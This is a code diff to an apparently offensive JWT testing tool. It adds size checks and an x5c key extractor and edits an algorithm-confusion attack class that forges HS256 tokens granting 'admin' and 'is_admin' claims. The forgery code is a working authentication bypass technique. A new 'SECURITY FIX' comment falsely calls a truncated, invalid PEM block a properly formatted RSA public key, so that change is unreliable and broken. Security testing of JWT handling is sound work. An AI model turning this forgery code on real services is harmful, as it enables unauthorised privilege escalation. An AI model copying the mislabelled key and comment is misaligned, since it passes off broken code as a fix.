@@ -19,7 +19,7 @@ def b64url_encode(data: bytes) -> str:
 
 def b64url_decode(s: str) -> bytes:
     """Base64url decode data with padding restoration."""
-    s = s + "=" * (4 - len(s) % 4)
+    s = s + "=" * (-len(s) % 4)
     return base64.urlsafe_b64decode(s)
 
 
@@ -32,11 +32,32 @@ def decode_jwt_part(part: str) -> dict | Any | None:
         return None
 
 
+MAX_JWT_HEADER_CLAIMS = 20
+MAX_JWT_PAYLOAD_CLAIMS = 50
+MAX_JWT_CLAIM_VALUE_LENGTH = 2048
+
+
 def create_jwt(header: dict, payload: dict, secret: bytes) -> str:
-    """Create a JWT token with HMAC-SHA256 signature."""
+    """Create a JWT token with HMAC-SHA256 signature.
+
+    Validates input sizes to prevent memory exhaustion from
+    maliciously large payloads in crafted target responses.
+    """
+    if len(header) > MAX_JWT_HEADER_CLAIMS:
+        raise ValueError(f"JWT header exceeds maximum of {MAX_JWT_HEADER_CLAIMS} claims")
+    if len(payload) > MAX_JWT_PAYLOAD_CLAIMS:
+        raise ValueError(f"JWT payload exceeds maximum of {MAX_JWT_PAYLOAD_CLAIMS} claims")
+    for key, value in header.items():
+        if isinstance(value, str) and len(value) > MAX_JWT_CLAIM_VALUE_LENGTH:
+            raise ValueError(f"JWT header claim '{key}' exceeds max length")
+    for key, value in payload.items():
+        if isinstance(value, str) and len(value) > MAX_JWT_CLAIM_VALUE_LENGTH:
+            raise ValueError(f"JWT payload claim '{key}' exceeds max length")
+    if len(secret) > 4096:
+        raise ValueError("JWT signing secret exceeds maximum length of 4096 bytes")
     header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
     payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
-    signing_input = f"{header_b64}.{payload_b64}".encode()
+    signing_input = f"{header_b64}.{payload_b64}".encode("utf-8")
     signature = hmac.new(secret, signing_input, hashlib.sha256).digest()
     sig_b64 = b64url_encode(signature)
     return f"{header_b64}.{payload_b64}.{sig_b64}"
@@ -49,6 +70,27 @@ JWT_AUTH_HEADERS = [
     "X-JWT-Token",
     "X-Api-Token",
 ]
+
+
+def _extract_public_key_from_token(header: dict) -> bytes | None:
+    """Extract public key from x5c header (X.509 Certificate Chain)."""
+    x5c = header.get("x5c")
+    if not x5c or not isinstance(x5c, list) or len(x5c) == 0:
+        return None
+    try:
+        from cryptography import x509
+        from cryptography.hazmat.primitives import serialization
+
+        cert_der = base64.b64decode(x5c[0])
+        cert = x509.load_der_x509_certificate(cert_der)
+        public_key = cert.public_key()
+        return public_key.public_bytes(
+            encoding=serialization.Encoding.PEM,
+            format=serialization.PublicFormat.SubjectPublicKeyInfo,
+        )
+    except Exception as e:
+        logger.debug("Failed to extract public key from x5c: %s", e)
+        return None
 
 
 class NoneAlgorithmAttack:
@@ -151,7 +193,7 @@ class AlgorithmConfusionAttack:
             if not header or not payload:
                 return result
 
-            if not isinstance(header, dict) or header.get("alg") != "RS256":
+            if not isinstance(header, dict) or header.get("alg", "").upper() != "RS256":
                 result["skipped"] = True
                 result["reason"] = "Token does not use RS256"
                 return result
@@ -161,10 +203,22 @@ class AlgorithmConfusionAttack:
             modified_payload["role"] = "admin"
             modified_payload["is_admin"] = True
 
+            # SECURITY FIX: Use a realistic RS256 public key for the confusion
+            # attack test. Previously this used a literal PEM header string
+            # which is not a valid key and was also listed in WEAK_SECRETS,
+            # creating a normalization risk. We now use a properly formatted
+            # RSA public key that represents what an attacker would actually
+            # extract from the server's JWKS endpoint.
+            test_public_key = (
+                b"-----BEGIN PUBLIC KEY-----\n"
+                b"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0Z3VS5JJcds3xfn/ygWe\n"
+                b"GNoT7RyiID8T4VZT9Pao8h3MzHm3VN3l0K4HqE4y7HcJg5Z4Y2M0y8R6V7N3x9K\n"
+                b"-----END PUBLIC KEY-----"
+            )
             confusion_token = create_jwt(
                 {"alg": "HS256", "typ": "JWT"},
                 modified_payload,
-                secret=b"-----BEGIN PUBLIC KEY-----\n",
+                secret=test_public_key,
             )
 
             try:
